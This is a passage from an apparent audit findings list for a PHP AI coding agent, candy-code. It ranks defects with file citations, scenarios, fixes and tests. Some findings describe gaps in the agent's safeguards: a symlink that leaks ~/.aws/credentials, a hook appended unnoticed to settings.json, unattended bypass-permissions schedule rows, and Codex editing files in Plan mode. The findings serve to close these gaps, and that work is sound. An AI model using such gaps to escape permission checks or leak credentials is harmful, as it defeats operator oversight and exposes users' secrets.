  - There is no 413 anywhere in `src/Server` (grep). The docblock :127-129 ("arrives whole and capped … cannot see a partial splice") and `docs/SERVER.md:299` ("the body (≤ 64 KiB)") both imply over-size is refused.
- **Scenario:** a CI or forge push payload of 80 KiB (multi-commit push events routinely exceed 64 KiB) against the prompt "Triage this push: {{payload}}" returns `200 {"ok":true}` and runs an agent turn on an empty payload. It is billed, silent, and the sender records a successful delivery.
- **Fix:** in `handle()`, before splicing, answer `413 payload_too_large` when `Content-Length` > MAX_API_BODY_BYTES, or when the request declared a body (`Content-Length` > 0 or `Transfer-Encoding: chunked`) and the buffered body is `''`. A pre-buffer size guard for the hook prefix in `Server` is preferable. Document the 413 in `docs/SERVER.md:299`.
- **Files:** `src/Server/Http/HookWebhooks.php`, optionally `src/Server/Server.php`, `docs/SERVER.md`.
- **Tests:** `tests/Server/HookWebhooksTest.php`: `Content-Length: 70000` with an empty body → 413 and `$run` never invoked. Add a server-stack test posting 70 KiB through the real middleware → 413.

### CTX-5-P1 [MINOR] [CONFIRMED] Served idle alarm is one-shot from submit time and is lost if a turn is still running when it fires
- **Where:** `src/Host/SessionHost.php:562` (armed only on submit), :656-661 (a one-shot `addTimer`), :678 (`isBusy()` → return, with the timer already nulled and never re-armed). Idleness is measured from `lastPromptAt` (:704). The TUI re-checks every 60 s (`src/App/App.php:4691-4697`), so the two hosts behave differently.
- **Scenario:** a 65-minute served turn means the alarm fires mid-turn and is dropped, so the session never folds overnight. A 59-minute turn instead gets a billed fold about a minute after it settles.
- **Fix:** re-arm when busy, and measure idleness from the later of prompt-accept and turn-settle.
- **Files:** `src/Host/SessionHost.php`.
- **Tests:** `tests/Host/SessionHostIdleAutoTest.php`: mid-turn re-arm; idleness counted from settle.

### CTX-1-P1 [MINOR] [PLAUSIBLE] `thinkingBudget` rides every toolless auxiliary backend (titles, summaries, autoReview, /btw)
- **Where:** `src/Cli/Bootstrap.php:9484-9516` (`toollessBackend()` builds from the same provider block); `src/Providers/AnthropicProvider.php:395-409` (the budget is request-blind and survives `withModel()`); `src/Providers/Concerns/AnthropicMessagesWire.php:509-515`.
- **Scenario:** with `thinkingBudget: 16000`, every session-title request spends thinking tokens and latency.
- **Fix:** strip the budget in `toollessBackend()` except for the summary backend, and document it in the `docs/SETTINGS.md` row.
- **Files:** `src/Cli/Bootstrap.php`, `docs/SETTINGS.md`.
- **Tests:** a Bootstrap pin: the title backend's request carries no `thinking` key, while the summary backend's does.

### CTX-1-P2 [MINOR] [PLAUSIBLE] No upper bound or model gate on the thinking budget, so a large budget or a non-thinking model 400s every turn
- **Where:** `src/Providers/ProviderFactory.php:999-1006` (floor only); `src/Providers/Concerns/AnthropicMessagesWire.php:512` (`max_tokens = max(…, 1.5×budget)`); `claude-3-5-haiku` is in the window table (`src/Providers/AnthropicProvider.php:74-75`).
- **Scenario:** `thinkingBudget: 50000` gives `max_tokens: 75000` and a 400 on every request; `/model claude-3-5-haiku` with any budget also 400s.
- **Fix:** a per-family output-ceiling clamp, plus omitting `thinking` for non-thinking families.
- **Files:** `src/Providers/AnthropicProvider.php`, `src/Providers/Concerns/AnthropicMessagesWire.php`, `src/Providers/ProviderFactory.php`.
- **Tests:** CTX-1 wire-body pins for the clamp and for the omission.

### CTX-2-P1 [MINOR] [PLAUSIBLE] PDFs have only a per-file 20 MiB cap: no 100-page check, no aggregate budget, and the block is re-sent every later turn
- **Where:** `src/Attachments/FileMentions.php:58-64` (base64 turns 20 MiB into ~26.7 MiB); `src/Providers/AttachmentEncoding.php:87-95` re-encodes every prior PDF on every request; there is no page-count check in `src`.
- **Scenario:** a 15 MB PDF plus a 10 MB PDF puts every later request over 32 MiB, so every turn 400/413s until `/undo`, `/rewind` or `/clear`.
- **Fix:** a cumulative document budget in `typedUserMessage()` (older blocks withheld with a notice), plus a page estimate at attach time that refuses above 100 pages.
- **Files:** `src/Backend/EngineBackend.php`, `src/Attachments/FileMentions.php`.
- **Tests:** a two-PDF aggregate test; a >100-page refusal.

### VIS-1-P1 [MINOR] [CONFIRMED] Startup summary omits the personal instruction files
- **Where:** `src/Support/StartupSummary.php:282-290` lists `loadDocuments()` only. `/context` includes `loadPersonal()` (`src/Host/Commands/ContextHostCommand.php:41-45`). COMPARISON.md:786 says "the instruction files actually loaded".
- **Scenario:** a Claude Code migrant whose only instructions live in `~/.claude/CLAUDE.md` (INT-1(b)) sees no instruction file listed in the summary.
- **Fix:** append the `loadPersonal()` documents with the personal marker, deduplicated by realpath.
- **Files:** `src/Support/StartupSummary.php`.
- **Tests:** `tests/Support/StartupSummaryTest.php`.

### INT-2-P2 [MINOR] [CONFIRMED] Agent-requested and manual Cursor rules are disabled with no user-visible explanation
- **Where:** `src/Context/Rule.php:233-238`; `ignoredFrontmatter()` is empty for these keys (`tests/Context/RuleLoaderTest.php:898`); `docs/MEMORY.md:745-750` never states the `alwaysApply` mapping.
- **Fix:** an aggregate `/rules`/launch hint ("N imported rules are off because `alwaysApply: false`…") plus a `docs/MEMORY.md` sentence.
- **Files:** `src/Context/Rule.php` or `RulesCommand`, `docs/MEMORY.md`.
- **Tests:** `RulesCommandTest` hint pin.

### INT-4-P2 [MINOR] [CONFIRMED] `~/.claude/settings.json` is outside the policy-freshness snapshot
- **Where:** `src/Cli/Bootstrap.php:4391-4460` (`checkPolicyFreshness` fingerprints only `config.json` + `hooks.yaml`); the `hookFileEntries` docblock (~:6047-6052) relies on a launch notice that never fires for that file.
- **Scenario:** a tool, or an agent's Bash heredoc, appends a command hook to `~/.claude/settings.json`; the next launch runs it with no drift notice.
- **Fix:** fingerprint the file into `PolicySnapshot` and `userChanged`, and bump `VERSION`.
- **Files:** `src/Cli/Bootstrap.php`, `PolicySnapshot`.
- **Tests:** `BootstrapHookFileTest`: editing that file between launches raises the drift notice.

### INT-4-P3 [MINOR] [CONFIRMED] `docs/HOOKS.md` contradicts the shipped unknown-event behaviour
- **Where:** `docs/HOOKS.md:72-74` ("Every other unknown event still refuses the launch") versus `src/Hooks/ClaudeSettingsHooks.php:54-67, 189-200` (every unmapped event is skipped and recorded) and `tests/Cli/BootstrapHookFileTest.php:814`.
- **Fix:** rewrite the bullet.
- **Files:** `docs/HOOKS.md`.
- **Tests:** a prose pin in `tests/Config/DocFigureProseDriftTest.php`.

### PLG-1-P3 [MINOR] [CONFIRMED] `bundles install <path>` dereferences symlinks, laundering out-of-tree files into the bundle and looping on cyclic links
- **Where:** `src/Cli/Subcommands.php:1877-1913` (`copyBundleTree` follows links when recursing and when copying).
- **Scenario:** `commands/notes.md -> ~/.aws/credentials` is copied as real bytes, bypassing the load-time containment refusal, so `/notes` sends the credentials. `loop -> ..` recurses.
- **Fix:** skip or refuse links, naming them.
- **Files:** `src/Cli/Subcommands.php`.
- **Tests:** `BundleInstallTest`: an outside link is refused or skipped, and a cyclic link terminates.

### PLG-1-P4 [MINOR] [CONFIRMED] Decline notices miss Claude's real manifest keys (`mcpServers`, inline `hooks` object)
- **Where:** `src/Bundles/Bundle.php`: `mcpFile()` reads `mcp`, and `declared()` drops non-string values. The launch notices (`src/Cli/Bootstrap.php:2296-2318`) therefore stay silent.
- **Scenario:** a bundle declaring hooks or MCP servers inline loads with no "declined" notice. Nothing runs, so this is an honesty gap only.
- **Fix:** treat any non-empty `hooks` value as declared, and read `mcpServers`.
- **Files:** `src/Bundles/Bundle.php`.
- **Tests:** `tests/Bundles/BundleTest.php`.

### PRV-2-P2 [MINOR] [PLAUSIBLE] No per-model thinking capability or range gate, so these combinations hard-400
- **Where:** `src/Providers/AnthropicProvider.php:395-398`, `src/Providers/Concerns/GeminiGenerateContentWire.php:260`, `src/Providers/EffortBudget.php` (max 32768).
- **Scenario:** `/effort low` on `claude-3-5-haiku`, `/effort max` on `gemini-2.5-flash` (ceiling 24576), and any `/effort` on `gemini-2.0-flash` each give a 400 every turn.
- **Fix:** a per-family capability and ceiling table.
- **Files:** `EffortBudget.php`, `AnthropicProvider.php`, `GeminiGenerateContentWire.php`.
- **Tests:** per-family wire pins.

### PRV-1-P1 [MINOR] [CONFIRMED] Catalog prefetch is a synchronous GET on the update path, freezing the TUI for up to 3 s
- **Where:** `src/Chat.php:17060-17066, 12207` → `ModelCatalog::prefetch()` → `src/Providers/OpenAiModelsEndpoint.php:63-89` (a blocking Guzzle `get`, 3.0 s connect + total; metadata only, so E646-clean).
- **Scenario:** Ctrl+P → Switch model on a slow or black-holed base stalls keys and repaint once per process.
- **Fix:** dispatch the fetch as a `Cmd`, then merge on a `ModelCatalogReadyMsg`.
- **Files:** `src/Chat.php`, a new Msg class.
- **Tests:** the palette returns immediately with the base tiers, and the Msg merges the live ids.

### PRV-3-P1 [MINOR] [PLAUSIBLE] Gemini `responseSchema` gets raw JSON Schema and rides a tools-bearing first step
- **Where:**
  - `src/Providers/Concerns/GeminiGenerateContentWire.php:280-293` sends the operator schema verbatim with `responseMimeType: application/json`;
  - `src/Providers/GeminiProvider.php:266-272` (`supportsJsonSchema()` true);
  - `src/Runtime.php:845-872` attaches the schema to the first step, which also declares tools.
- **Scenario:** `candy-code -p --json-schema schema.json` on gemini, with a schema using `$schema`/`additionalProperties`/`$defs`. Gemini's `responseSchema` takes only an OpenAPI-subset schema and rejects unknown fields, and many Gemini models reject a JSON mime type alongside function declarations. Either way AUT-4's honesty gate admits the run and the first billed call 400s. The failure is loud, which keeps this MINOR. Also cited under AUT-4.
- **Fix:** use `responseJsonSchema` where supported, or sanitise to the subset; drop tools on the constrained step for this wire.
- **Files:** `GeminiGenerateContentWire.php`.
- **Tests:** `GeminiProviderTest` body pins.

### PRV-4-P2 [MINOR] [CONFIRMED] The pasted API key echoes to the terminal
- **Where:** `src/Cli/Subcommands.php:942` (`fgets(\STDIN)` with TTY echo on).
- **Fix:** `stty -echo` around the read when `stream_isatty`, restored in `finally`.
- **Files:** `src/Cli/Subcommands.php`.
- **Tests:** an injectable-tty seam pin.

### PRV-4-P3 [MINOR] [CONFIRMED code path / PLAUSIBLE upstream] Codex runs its own agent outside candy-code's permission mode and hooks, and this is undocumented
- **Where:** `src/Providers/CodexProvider.php:27-31, 56-61`; `src/Providers/CodexInvocation.php:80-96` (`-s` only when configured); `README.md:176` implies the safety hooks wire automatically.
- **Scenario:** candy-code in Plan mode, with codex configured `workspace-write`, still edits files.
- **Fix:** map Plan and read-only modes to `-s read-only` (narrowing only), and document the posture.
- **Files:** `CodexInvocation.php`, `README.md`, `docs/SETTINGS.md`.
- **Tests:** a `CodexInvocation` argv pin for plan mode.

### MCP-1-P1 [MINOR] [CONFIRMED] `@mcp:` resources (and MCP-2 prompt commands) exist only in the TUI; served/web sessions and `-p` refuse them
- **Where:**
  - only `Chat::userTurnMessage` passes `mcpClientProvider()` (`src/Chat.php:9927-9935`);
  - `SessionHost` calls `TurnController::userTurnMessage` without it (`src/Host/SessionHost.php:1702-1710`);
  - `NonInteractive` builds `ContextMentions` with no `withMcpReader` (`src/Cli/NonInteractive.php:448-458`);
  - so `ContextMentions::mcp()` answers "no MCP client is open in this run" (`src/Attachments/ContextMentions.php:398-400`) even though MCP tools work in both hosts;
  - `McpPromptCommands` is merged only in the `Chat` ctor (`src/Chat.php:1796`).
- **Scenario:** a candy-code-web user types `@mcp:docs:file:///guide.md` and gets a refusal for a server whose tools the same session calls freely. COMPARISON.md §6.5 presents the feature without a TUI-only qualifier.
- **Fix:** pass the workspace MCP client provider from `SessionHost` (and the `-p` path) into `userTurnMessage`/`ContextMentions`, and merge the prompt specs into the host command map; otherwise qualify the docs as TUI-only.
- **Files:** `src/Host/SessionHost.php`, `src/Cli/NonInteractive.php`, `docs/MCP.md`, `COMPARISON.md` §6.5.
- **Tests:** `tests/Host/TurnControllerMcpSeamTest.php`: a served submit resolves `@mcp:`; a NonInteractive test does the same.

### MCP-7-P2 [MINOR] [CONFIRMED] Allow rules do not translate, so a server crossing the floor silently loses the operator's per-tool grants
- **Where:** `src/Permissions/PermissionRule.php:520-538` (only restrictive rules are translated); `docs/MCP.md:715-721` ("Grants translate in neither direction"). Deferral is on by default (`mcp.lazySchemaTokens` 8000).
- **Scenario:**
  - A `-p` CI job relies on `Allow mcp__jira__create_ticket`.
  - Adding tools to jira pushes it past the floor, so the call becomes `mcp_call(jira, create_ticket)`.
  - The Allow no longer matches, so the call becomes an Ask, which is refused unattended (or Denied under dont-ask).
  - The pipeline breaks with nothing at launch connecting it to the deferral.

  Translating an exact-name Allow onto the args form grants exactly the capability it names, so the "grant covers what it names" doctrine permits it.
- **Fix:** translate an exact (non-glob) `Allow mcp__s__t` onto `mcp_call` with `server=s,tool=t`, keeping globbed Allows untranslated. At minimum, add a launch notice listing the Allow rules that a deferral left inert.
- **Files:** `src/Permissions/PermissionRule.php`, `docs/MCP.md`, `docs/PERMISSIONS.md`.
- **Tests:** `tests/Permissions/McpDispatchParityTest.php`: an exact Allow covers the dispatched call, while a glob Allow does not.

### MCP-7-P3 [MINOR] [PLAUSIBLE] `mcp_list` truncates at 64 KiB with no per-tool lookup, so a fat server's later tools are undiscoverable
- **Where:** `src/Tools/BuiltIn/McpListTool.php:131` (`truncateOutput(..., DEFAULT_MAX_OUTPUT_BYTES)` = 65,536, `src/Tools/Concerns/TruncatesOutput.php:155`); the input schema offers only `server` (:79-92). A server is deferred precisely because its schemas are large; a single server above ~16k schema tokens overflows even the filtered listing.
- **Scenario:** a 150-tool server is deferred, and `mcp_list(server)` cuts off mid-roster, so the model cannot learn the arguments of the tools past the cut.
- **Fix:** add a `tool` filter (exact name → that schema only) and/or `offset` paging, plus a names-only overview when unfiltered.
- **Files:** `src/Tools/BuiltIn/McpListTool.php`, `docs/MCP.md`, the tool-doc generator rows.
- **Tests:** `tests/MCP/McpDispatcherToolsTest.php`: a roster above the cap stays reachable via `tool` or `offset`.

### AUT-1-P2 [MINOR] [CONFIRMED] A row hand-written mid-session never fires from a TUI whose roster had no enabled row at launch, even though the in-product help instructs the user to hand-write one
- **Where:**
  - the clock tick is armed only when `hasEnabled()` is true or a daemon is active (`src/Chat.php:18118-18128`);
  - the file is reloaded only inside that tick (`pumpSchedules` :18525) or by `/schedules` (`src/Host/Commands/SchedulesCommand.php`);
  - `src/Background/ScheduleRegistry.php:141-143` acknowledges the gate;
  - `host.schedules.none` tells the user to write `~/.candy-code/schedules.json` (`lang/en.php:2002`).
- **Scenario:**
  1. `/schedules` prints "No schedules. Write a row to ~/.candy-code/schedules.json…".
  2. The user writes the row.
  3. The row never fires in this TUI until they happen to run `/schedules` again or restart (serve hosts do fire it).
- **Fix:** keep a slow (e.g. 30 s) stat/digest tick armed whenever a persisted path exists, or re-arm on `/schedules` and say so in the help text.
- **Files:** `src/Chat.php` (`subscriptions`), `lang/en.php`.
- **Tests:** `tests/Chat/ScheduleLoopFireTest.php`: a file row written after launch with an empty roster fires within one slow tick.

### AUT-1-P3 [MINOR] [CONFIRMED] The scheduled "floor" is only a default: a `bypass-permissions` row runs unattended with no flag, while serve and webhooks refuse the same posture
- **Where:**
  - the spec wanted a "Scheduled floor: dontAsk-style non-interactive";
  - `src/Background/Schedule.php:110-112` normalises only a missing or unknown mode, and a spelled `bypass-permissions` rides unchanged (docblock :29-41 "ownership posture");
  - `ScheduleSpawner.php:60` passes it through;
  - by contrast serve requires `--allow-bypass` (`src/Server/ServerConfig.php:561-564`) and webhooks refuse it outright (:752-758).
- **Scenario:** one hand-edited (or tool-written) row with `"permissionMode":"bypass-permissions"` gets an unattended agent run with every ask auto-allowed, every period, in whatever repo the AUT-1-P1 race picks.
- **Fix:** either clamp persisted rows to a ceiling (refuse bypass-class with a load note, like `webhooksValue`), or require an explicit user-tier `schedules.allowBypass` and announce it at load. Document the decision.
- **Files:** `src/Background/Schedule.php`, `src/Background/ScheduleRegistry.php`, `lang/en.php`.
- **Tests:** `tests/Sessions/ScheduleTest.php`: a bypass row is refused or clamped with a load note.

### AUT-2-P1 [MINOR] [CONFIRMED] The envelope's `session_id` is emitted before the session is persisted, so a failed save leaves a dangling id
- **Where:** the envelope is built with `$opened['id']` (`src/Cli/NonInteractive.php:601-612`) and printed at :637-641, then the lazy mint, `recordTurn` and save happen at :653-664, where a failure is only a stderr line. The docblock claims "`session_id` names the row this run persisted its answer to" (:1843).
- **Scenario:**
  1. The store is locked or read-only (e.g. a CI cache volume).
  2. The JSON consumer stores `session_id` for a later `-p --resume <id>`.
  3. That resume fails with "no such session", and the first run's exit code was 0.
- **Fix:** persist before rendering inside the same try, and omit `session_id` when the save fails. Or keep the answer-first order but switch `--output-format json` to emit after the save, setting `session_id` only on success.
- **Files:** `src/Cli/NonInteractive.php`.
- **Tests:** `tests/Cli/NonInteractiveSessionPersistenceTest.php`: a forced save failure means the envelope has no `session_id`.

### AUT-4-P1 [MINOR] [CONFIRMED — probed] `--json-schema` on a TUI (non `-p`) launch parses clean and is silently ignored
- **Where:**
  - `ArgvParser::parse(['candy-code','--json-schema','{"type":"object"}'])` gives `usageError=null`, `promptRequested=false`, `jsonSchema` set (scratch `php -r` probe);
  - `bin/candy-code` never reads `$args->jsonSchema`; only `NonInteractive` consumes it (`src/Cli/NonInteractive.php:420`);
  - the parser comment (`src/Cli/ArgvParser.php:640-651`) claims every unhonourable case is refused "never silently ignored".
- **Scenario:** `candy-code --json-schema s.json` opens the TUI and answers unconstrained — set-but-ignored, the exact failure AUT-4's honesty law bans.
- **Fix:** a usage error (exit 2) when `--json-schema` is given without `-p`/`run`. The same check is worth applying to `--output-format`.
- **Files:** `src/Cli/ArgvParser.php`, `lang/en.php`, `README.md` flag notes.
- **Tests:** `tests/Cli/LaunchFlagsTest.php`: `--json-schema` without a prompt is a usage error.

### AUT-4-P2 [MINOR] [CONFIRMED] The schema constrains the first step, not the terminal answer: a tool-using turn settles unconstrained, silently, and the README does not say so
- **Where:**
  - `src/Runtime.php:845-872` attaches the schema only when no tool result is newer than the newest tool-calling assistant row. That is the first step; every post-tool step, including the final answer, goes out free.
  - The docblock :833-841 calls it a "DISCLOSED GAP … silently goes unhonoured".
  - The spec said "terminal/self-finishing turn only".
  - `README.md:1731` says "constrain the answer to a JSON Schema" with no caveat, and the json envelope carries no flag.
  - On strict-decoding hosts (sglang) the constrained first step cannot emit tool calls at all, so `--json-schema` also disables tools.
- **Scenario:** `-p "run the tests and report failures as JSON" --json-schema r.json`. Either the model is forced into JSON without running anything, or (on a looser host) it calls tools and the final answer is free text that fails the consumer's parse with exit 0.
- **Fix:** add an envelope key (`json_schema_applied: false`) or a stderr notice when the settled step was unconstrained; disclose the boundary in the README. v2: re-request the final step under the schema when the loop ended unconstrained (one extra billed call, opt-in).
- **Files:** `src/Cli/NonInteractive.php`, `src/Runtime.php`, `README.md`.
- **Tests:** `tests/Backend/EngineBackendJsonSchemaTest.php`: a tool-using turn sets the flag or notice.
- **Cross-ref:** the Gemini dialect/tools 400 is filed as PRV-3-P1.

### AUT-6-P2 [MINOR] [CONFIRMED] `dont-ask` (the strictest mode) is classed as bypass-class: refused for hooks and "clamped" UPWARD to `default`, while the docblock misstates what happens to asks
- **Where:**
  - `answersAsksWithoutAHuman()` puts DontAsk beside BypassPermissions (`src/Server/ServerConfig.php:574-577`);
  - DontAsk actually denies every non-read (`src/Permissions/PermissionGate.php:1161-1170`; `PermissionMode::strictness()` = 5, the strictest);
  - `webhooksValue()` refuses `permissionMode: dont-ask` for a hook (:752-758);
  - `hookPermissionModeFallback()` maps a dont-ask server to `default` (:592-597), which widens it;
  - `tests/Server/ServerConfigHookModeInheritanceTest.php:54` pins the widening as intended.
  - The docblock :590 says default-mode asks are refused by "the daemon's no-terminal approver", but the webhook spawn passes `permissionAskTimeout: $config->askTimeoutSeconds` (`src/Cli/Serve.php:443`), which arms the human relay (`src/Background/BackgroundSupervisor.php:605-610, 668-673`; `0` = wait forever).
- **Scenario:** the operator wants the safest unattended webhook, read-only `dont-ask`, and is refused at launch. A server run in `dont-ask` hands mode-less hooks `default` instead, so an attacker-shaped payload can now raise write asks that land in the operator's approvals drawer, and can park a bg slot indefinitely when `askTimeoutSeconds` is 0.
- **Fix:** narrow the hook predicate to `isBypass()` (and Auto/AcceptEdits if a ceiling is wanted); clamp the inheritance to the stricter of the server's mode and `default`; correct the docblock about the relay, or spawn hooks without a relay window.
- **Files:** `src/Server/ServerConfig.php`, `src/Cli/Serve.php`, `docs/SERVER.md:299`.
- **Tests:** flip `ServerConfigHookModeInheritanceTest:54`; add a `ServerConfigWebhooksTest` case where `dont-ask` is accepted for a hook.

### CTX-5-P2 [NIT] [CONFIRMED] Docs name the wrong reuse point and do not disclose the declined cache-warm tier
- **Where:** COMPARISON.md:800 says `scheduleParkedCompaction`, but the served path uses `requestAheadOfNeed()` (`src/Host/SessionHost.php:715`) and the TUI uses `buildSummarizationRequest` (`src/Chat.php:14185-14199`). The not-shipped short tier is undisclosed in `docs/SETTINGS.md`.
- **Fix:** correct :800 and add a sentence to the SETTINGS row.

### VIS-1-P2 [NIT] [CONFIRMED] The summary memo key ignores branch, instruction and memory facts, and gather runs git plus a skill scan inside `view()`
- **Where:** `src/Support/StartupSummary.php:84-85` (the key), :265 (`git branch`), :323-326 (`SkillManager::loadAll`).
- **Fix:** clear the memo on `/clear` and session switch, or gather once via a Cmd.
- **Tests:** after `/clear` and a branch change, the summary repaints the new branch.

### VIS-2-P1 [NIT] [CONFIRMED] `/memory open` edits bypass the memory git-history journal
- **Where:** `src/Chat.php:15628-15661` answers before `MemoryCommand`'s `MemoryHistoryCommand::record` (`src/Host/Commands/MemoryCommand.php:60-62, 82-84`).
- **Fix:** record from `EditorCommand::openCollect` on exit 0.
- **Tests:** `/memory open` then `/memory log` shows the entry.

### VIS-3-P1 [NIT] [CONFIRMED] COMPARISON.md:788 still says reconnect "restarts from launch-time entry bytes"
- **Where:** the code re-reads via `loadConfig()` behind the digest gate (`src/Commands/McpAuthCommand.php:181-191, 213-220`; `docs/MCP.md:125-133`).
- **Fix:** reword :788 to "behind the launch-digest drift gate (drifted/unknown refuse)".

### VIS-3-P2 [NIT] [PLAUSIBLE] "Read-only" `/hooks` rebuilds the launch chain with process-global side effects
- **Where:** `src/Host/Commands/HooksHostCommand.php:30` → `Bootstrap::hooks()` (`installSecretEnvAllowlist` :5830, `lspClient` :5869, `TeamManager::useLaunchHooks` :5983).
- **Fix:** a side-effect-free inspection accessor, or inspect the memoised launch HookManager.

### VIS-4-P1 [NIT] [CONFIRMED] "Superset" wording versus reasoned slash-only survivors
- **Where:** COMPARISON.md:789 versus `SLASH_ONLY_SURVIVORS` (e.g. `/effort`, 63249863a).
- **Fix:** reword.

### VIS-6-P1 [NIT] [CONFIRMED] The English plural is injected as a Lang parameter
- **Where:** `src/Runtime.php:5991-5994` → `chat.memory.recalled_notice` (`lang/en.php:1898`).
- **Fix:** split into `.one`/`.many` keys.

### INT-1-P1 [NIT] [CONFIRMED] `instructionsExclude` matches ancestor files by absolute path
- **Where:** `src/Context/InstructionFileLoader.php:615-632` (disclosed in the docblock).
- **Fix:** a doc-only hint in the SETTINGS help (`**/CLAUDE.local.md` reaches ancestors).

### PLG-1-P5 [NIT] [CONFIRMED] Install inconsistencies
- **Where:** a leading-dot manifest name is accepted (`src/Cli/Subcommands.php:1692`) but never discovered (`BundleDiscovery::scanContainer` glob); the git arm keeps `.git` while the path arm strips it (docblock :1606-1612).
- **Fix:** refuse leading-dot names, and remove `.git` after a clone.
- **Tests:** a `BundleInstallTest` dot-name refusal.

### PRV-1-P2 [NIT] [CONFIRMED] Merge order is `current-three > live > LiteLLM` against the spec's `live > LiteLLM > three`
- **Where:** `src/Providers/ModelCatalog.php:18-26`, disclosed in the docblock.
- **Fix:** none unless the owner wants live-first.

### PRV-4-P4 [NIT] [CONFIRMED] README calls codex login a "PKCE fork"
- **Where:** `README.md:1595`; it is actually a stdio passthrough to `codex login` (`src/Cli/Subcommands.php:876, 889-925`).
- **Fix:** reword.

### MCP-4-P1 [NIT] [PLAUSIBLE] A forked child's first SSE call frees the inherited TLS stream, which can send `close_notify` on the parent's connection
- **Where:** `src/MCP/SseMcpServer.php:413` (`openStream()` overwrites `$this->socket` without detaching the parent's resource). PHP's openssl stream close runs `SSL_shutdown` when the inherited resource's refcount drops in the child, putting a close alert on the shared TCP connection. The parent then sees a dropped stream and spends its `RECONNECT_BUDGET` (:104) on the next parent-side call (e.g. `@mcp:`, panel).
- **Fix:** keep a reference to the inherited socket in the child (never free it), or `stream_socket_shutdown`-free detach via a dup'd fd. Recovery already exists, so this is only churn.
- **Tests:** a forked-child test asserting the parent's stream stays up (https stub).

### MCP-5-P1 [NIT] [CONFIRMED] The login URL is scraped from a 1500-byte merged stdout+stderr tail, first match wins
- **Where:** `src/Support/McpLoginFork.php:113-125` (tail truncated to `TAIL_MAX_BYTES` before the regex; `~https://\S+|http://\S+~`).
- **Scenario:** an authorize URL over 1500 B (many scopes plus `resource=` plus PKCE) or a preceding diagnostic URL means the transcript announces nothing, or the wrong link.
- **Fix:** scan each chunk before truncation and prefer a line-anchored marker the CLI prints (e.g. a fixed `Open:` prefix).
- **Tests:** an `argvOverride` stub printing a 2 KB URL is announced intact.

### AUT-1-P4 [NIT] [CONFIRMED] "No timeout anywhere on this path" is false — a scheduled daemon is killed at the default 3600 s run limit
- **Where:** `src/Background/Schedule.php:207-208` (claim); `ScheduleSpawner.php:54-61` passes no `timeoutSeconds`, so `spawnSession` defaults to 3600 (`src/Background/BackgroundSupervisor.php:624`) and stops the run "ran past its 3600 s limit" (:1443). E646 forbids blanket total-request timeouts on LLM calls; this is a session cap, but the docblock claims there is none.
- **Fix:** correct the docblock, or let a row carry `timeoutSeconds` (0 = none) and document the default.
- **Files:** `src/Background/Schedule.php`, `ScheduleSpawner.php`.
- **Tests:** a `ScheduleTest` pin for the passed limit.

### AUT-6-P3 [NIT] [CONFIRMED] Small `HookWebhooks` hygiene
- `PromptFence::escape()` can throw on a PCRE failure (`src/Context/PromptFence.php:319-323`) and is called outside `handle()`'s try (`src/Server/Http/HookWebhooks.php:131-133` vs :135), so a pathological body becomes an unstructured 500 instead of the generic 503.
- The configured `rate` is enforced per hook and address (:108, :123), while `docs/SERVER.md:299` and `settings.webhooks.help` say "per-minute rate". A leaked secret used from N addresses gets N× the rate.
- **Fix:** move the splice inside the try, and either document "per address" or add a per-hook global window.
- **Tests:** a `HookWebhooksTest` global-rate case.

## Annotation re-checks

- **VIS-1 rcp1 (no agent count ever assembled):** resolved. `src/Support/StartupSummary.php:147` iterates memories/skills/mcpServers only. COMPARISON.md:711 and :786 both read "memory/skill/MCP counts"; the f6 cites :709/:784 have drifted +2 with the substance intact.
- **VIS-1 x5 F1 (raw servedModel interpolated):** resolved. `providerAndModel()` routes the model through `oneLine()` before the memo key and the row (`src/Support/StartupSummary.php:229-256`), per bdc8a85fb.
- **VIS-1 x5 F2 (cite drift):** line drift only. The placeholder branch is at `src/Renderer.php:4214-4230` and the StartupSummary call at :4223, both as annotated.
- **VIS-1 x5 F4 / x14 (COMPARISON twin):** resolved (see rcp1).
- **VIS-3 x5 F3 (five-arm match :167-173):** resolved. `src/Commands/McpAuthCommand.php:167-174` carries list/add/remove/login/reconnect + default.
- **MCP-6 rcp2 (`reconnectServer` never existed; whole-session pair behind a re-stat gate):** accurate.
  - `grep reconnectServer src tests` is empty.
  - The gate at `src/Commands/McpAuthCommand.php:213-220` refuses drifted and unknown verdicts before `reconnectPair()`.
  - Residual doc lie: COMPARISON.md:788 (VIS-3-P1).
- **PLG-1 rcp2 (SUBCOMMANDS 8→9 superseded; live roster 11):** holds. `src/Cli/ParsedArgs.php:56` = acp, attach, bundles, completion, doctor, login, mcp, models, self-update, serve, session.
- **PRV-1 rcp3 (`models --all` refused, operand `models all`, cite :663):** holds. `src/Cli/Subcommands.php:659-668`; the unknownFlags sentence is at :662-663.
- **§5 R2 (MCP-3 RULED-by-delivery):** holds. Project wins a shared name and user entries need no repo trust (`docs/MCP.md:96-120`, `src/MCP/McpClient.php:241-279`). The ruling's posture now carries MCP-3-P1 (cwd), which the ruling never considered.
- **§5 R1/R3/R7/R9/R12:** R1 (bare `/memory` = help), R7 (strict-bottom foreign commands, `src/Commands/CommandLoader.php:619-626`), R9 (one-per-turn) and R12 (no safeguard switch) are ruled by delivery. R3 (CC `Notification` case) is still skip-and-record, and the owner ruling remains open.
- **§7 supersession notice (inv-63/64/65a/65b on these items):** holds. The CTX-1 seam lines are gone, `FILENAMES` has seven entries (`src/Context/InstructionFileLoader.php:180`), `McpAuthCommand` has five arms, and the AUT-2 `--resume`-under-`-p` defect is fixed (`src/Cli/NonInteractive.php:311-349`).

## Missing from the plan

- **Outbound webhooks** (COMPARISON.md §6.5 Automation "Outbound webhooks remain deferred", Observability "Outbound webhooks deferred"). Step: a user-tier `webhooksOut` map with an EventSink subscriber that POSTs HMAC-signed JSON for `turn.finished`/`session.ended`/`permission.asked`. Bounded retry with backoff, never on the turn path, never a request timeout on LLM calls.
- **Inbound webhook signatures.** AUT-6 authenticates only by a static custom header (`x-candy-code-hook`). GitHub cannot send custom headers (it signs `X-Hub-Signature-256`), and Stripe/Slack sign too, so the main webhook producers cannot call the shipped endpoint without a proxy. Step: an optional per-hook `signature: {scheme: "github-sha256"|"hmac-sha256", header}` verified with `hash_equals` over the raw body, plus delivery-id dedupe.
- **Schedules UX** (beyond AUT-1-P1..P4). Steps:
  - a `/schedules add` verb, or a documented file-format page;
  - per-row `root` (AUT-1-P1);
  - surfacing fire/refusal outcomes on serve (`BackgroundEvents::pumpSchedules` discards `fireDue` results, `src/Host/BackgroundEvents.php:227-230`; spawn refusals are invisible to web users);
  - `/loop` for served/web sessions.
- **MCP elicitation / sampling / roots / logging / list_changed / ping** (COMPARISON.md:346 MCP-08 "Server-initiated requests (even ping) are ignored", :646). Step:
